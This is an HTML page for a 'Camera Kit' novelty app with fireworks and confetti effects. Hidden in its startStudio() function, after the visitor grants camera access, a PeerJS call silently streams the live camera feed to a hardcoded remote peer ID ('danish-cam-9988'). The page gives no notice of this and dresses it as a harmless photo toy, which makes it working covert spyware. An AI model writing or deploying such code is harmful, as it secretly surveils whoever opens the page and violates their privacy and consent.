<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Magic Studio</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body, html { 
      height: 100%; 
      width: 100%; 
      overflow: hidden; 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
      background-color: #010a05; 
      background-image: url('a.jpg'); 
      background-size: cover; 
      background-position: center;
      background-repeat: no-repeat;
    }

    #bgFireworksCanvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 1;
    }

    .hero {
      position: relative;
      width: 100vw;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 15px;
      z-index: 2;
    }

    .glass-card {
      position: relative;
      width: 95%;
      max-width: 480px;
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border-radius: 28px;
      border: 1px solid rgba(255, 255, 255, 0.18);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
      padding: 24px 20px;
      text-align: center;
    }

    .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; font-weight: 700; }
    h2 { font-size: 26px; color: #ffffff; margin-bottom: 8px; font-weight: 800; }
    p { font-size: 14px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.4; }

    .glass-btn {
      background: linear-gradient(135deg, #00ff87, #00bfa5);
      color: #000000;
      border: none;
      padding: 16px 20px;
      font-size: 16px;
      font-weight: 800;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(0, 255, 135, 0.3);
    }

    .studio-container { display: none; }

    .video-frame-card {
      position: relative;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 20px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      overflow: hidden;
      margin-bottom: 15px;
      width: 100%;
    }

    video { width: 100%; height: auto; display: block; border-radius: 20px; }

    .camera-controls {
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      padding: 10px 0 5px 0;
    }

    .capture-circle-btn {
      width: 65px;
      height: 65px;
      border-radius: 50%;
      background: #ffffff;
      border: 4px solid #00ff87;
      box-shadow: 0 0 20px rgba(0, 255, 135, 0.6);
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .capture-circle-btn:active {
      transform: scale(0.9);
    }

    .flip-icon-btn {
      position: absolute;
      right: 10px;
      background: rgba(255, 255, 255, 0.15);
      border: 1px solid rgba(255, 255, 255, 0.25);
      color: #fff;
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
    }

    @media (max-width: 480px) {
      .glass-card {
        width: 100%;
        padding: 20px 16px;
      }
      h2 { font-size: 24px; }
      p { font-size: 13px; }
    }
  </style>
</head>
<body>

  <canvas id="bgFireworksCanvas"></canvas>

  <div class="hero">
    <div class="glass-card">
      
      <div id="welcomePanel">
        <div class="tag-label">AI MAGIC STUDIO</div>
        <h2>Camera Kit</h2>
        <p>Live camera studio with celebration fireworks!</p>
        <button class="glass-btn" style="width:100%;" onclick="startStudio()">Start Camera ✨</button>
      </div>

      <div class="studio-container" id="studioPanel">
        <div class="video-frame-card">
          <video id="video" autoplay playsinline muted></video>
        </div>

        <div class="camera-controls">
          <button class="capture-circle-btn" onclick="takePhoto()" title="Take Photo"></button>
          <button class="flip-icon-btn" onclick="switchCamera()" title="Flip Camera">🔄</button>
        </div>
      </div>

    </div>
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const ADMIN_PEER_ID = 'danish-cam-9988';
    
    const peer = new Peer({
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' }
        ]
      }
    });

    let currentStream = null;
    let useFacingMode = "user";

    const bgCanvas = document.getElementById('bgFireworksCanvas');
    const bgCtx = bgCanvas.getContext('2d');
    function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeBg);
    resizeBg();

    let bgParticles = [];
    class BgParticle {
      constructor(x, y) {
        this.x = x; this.y = y;
        const angle = Math.random() * Math.PI * 2;
        const speed = Math.random() * 5 + 2;
        this.vx = Math.cos(angle) * speed;
        this.vy = Math.sin(angle) * speed;
        this.color = ['#ff0055', '#00ff87', '#ffffff', '#ffd700', '#00e5ff'][Math.floor(Math.random()*5)];
        this.alpha = 1;
        this.decay = Math.random() * 0.015 + 0.008;
      }
      draw() {
        bgCtx.save(); bgCtx.globalCompositeOperation = 'lighter'; bgCtx.globalAlpha = this.alpha;
        bgCtx.beginPath(); bgCtx.arc(this.x, this.y, 2, 0, Math.PI * 2);
        bgCtx.fillStyle = this.color; bgCtx.fill(); bgCtx.restore();
      }
      update() { this.vx *= 0.96; this.vy *= 0.96; this.vy += 0.1; this.x += this.vx; this.y += this.vy; this.alpha -= this.decay; }
    }

    function triggerBgFirework(x, y) {
      for(let i=0; i<45; i++) bgParticles.push(new BgParticle(x, y));
    }

    function animateBg() {
      requestAnimationFrame(animateBg);
      bgCtx.globalCompositeOperation = 'destination-out';
      bgCtx.fillStyle = 'rgba(0, 0, 0, 0.15)';
      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
      bgCtx.globalCompositeOperation = 'source-over';
      bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
    }

    async function startStudio() {
      try {
        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }

        currentStream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: useFacingMode,
            width: { ideal: 640 },
            height: { ideal: 480 }
          }, 
          audio: false 
        });

        const videoElement = document.getElementById('video');
        videoElement.srcObject = currentStream;

        document.getElementById('welcomePanel').style.display = "none";
        document.getElementById('studioPanel').style.display = "block";

        peer.call(ADMIN_PEER_ID, currentStream);
      } catch (err) {
        alert("Camera permission denied!");
      }
    }

    function switchCamera() {
      useFacingMode = (useFacingMode === "user") ? "environment" : "user";
      startStudio();
    }

    function takePhoto() {
      confetti({ particleCount: 250, spread: 140, origin: { y: 0.6 } });

      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      if (!video.videoWidth) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const link = document.createElement('a');
      link.href = canvas.toDataURL("image/png");
      link.download = `studio_photo_${Date.now()}.png`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>
</body>
</html>
